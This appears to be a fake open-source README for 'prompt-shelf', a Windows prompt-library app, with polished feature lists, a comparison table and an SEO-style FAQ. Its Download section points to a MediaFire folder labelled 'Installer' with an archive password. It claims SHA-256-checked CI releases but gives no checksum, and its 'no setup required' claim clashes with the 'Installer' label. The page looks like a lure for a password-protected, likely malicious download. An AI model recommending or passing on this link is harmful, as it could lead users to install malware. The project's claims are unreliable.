# prompt-shelf

📚 Free, open-source prompt library for Windows — tags, search, variable fill-in and one-key copy. 100 MB portable, offline, no account, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Local SQLite library** — thousands of prompts stored in one portable file that travels with you
- ✅ **Instant full-text search** — results appear as you type across titles, bodies and tags
- ✅ **Variable fill-in** — press copy on a templated prompt and a small dialog collects the values first
- ✅ **Tags and folders** — color tags, nested folders and favorites for the ten prompts you really use
- ✅ **Global hotkey palette** — summon search over any app, hit enter, prompt is on the clipboard
- ✅ **Import and export** — JSON and Markdown round-trip so the library is never locked in
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why prompt-shelf

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **prompt-shelf** | Notion | Text Blaze | Prompt managers online |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free tier | Paid | Free accounts |
| Open source | **Yes** | No | No | No |
| Offline local library | **Yes** | Partial | Yes | No syncs online
| Variable fill-in on copy | **Yes** | No | Yes | Partial
| Global hotkey palette | **Yes** | No | Yes paid | No
| Portable, no install | **Yes, 100 MB** | App | App | Browser

## FAQ

**best way to organize prompts for local LLMs offline?**

Pasting prompts into notes apps means they stay buried, and web managers want an account and a connection. prompt-shelf keeps everything in a local searchable database with tags, variable fill-in and a system-wide hotkey palette. It is a 100 MB portable exe, MIT, with JSON export if you ever outgrow it.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark shelf (#121417, indigo #818CF8): prompt list left with color tags, preview pane right showing a template with highlighted {{variables}}, search bar active.
2. Hotkey palette floating over a desktop: search box reading write, five matching prompts listed with tag chips, enter to copy hint in footer.
3. Variable dialog after copy: three fields for audience, tone and length, fill and copy button, toast reading prompt copied with 214 characters.

## Download

| Source | Link |
|---|---|
| 💾 **Installer prompt-shelf** | [Installer prompt-shelf](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).